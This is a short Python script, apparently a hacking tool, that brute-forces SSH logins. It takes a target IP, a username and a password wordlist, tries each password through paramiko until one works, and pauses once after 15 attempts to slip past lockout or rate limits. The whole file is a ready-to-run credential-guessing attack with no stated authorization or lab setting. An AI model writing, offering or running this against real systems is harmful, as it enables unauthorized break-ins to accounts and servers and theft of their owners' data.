#!/usr/bin/python3
from pwn import *      # pwntools library for exploit development
import paramiko        # Python implementation of SSH v2 protocol
from time import sleep

# Get user input for target details
host = input("Enter the target IP>> ")    
username = input("Target Username: ") 
word_list = input("Enter the path to word list>> ")  

# Initialize attempts counter
attempts = 0

# Open the wordlist file for brute-force attack
with open(word_list, "r") as passwords_list:
    for password in passwords_list:
        password = password.strip()  # Remove newline characters and spaces

        # Attempt connection using the current password
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))

            # Initialize SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Connect using the given credentials
            client.connect(hostname=host, username=username, password=password, timeout=2)

            # If connected, print the valid password and exit
            print("[>] Valid password found: '{}'!".format(password))
            client.close()
            break
        except paramiko.AuthenticationException:
            print("[+] Invalid password!!")
        except paramiko.SSHException:
            print("[!] SSH connection failed or blocked.")
        except Exception as e:
            print(f"[!] An error occurred: {e}")

        # Increment attempts counter
        attempts += 1
        if attempts == 15:  # Fixed condition
            print("[!] Too many attempts, pausing for 30 seconds...")
            sleep(30)
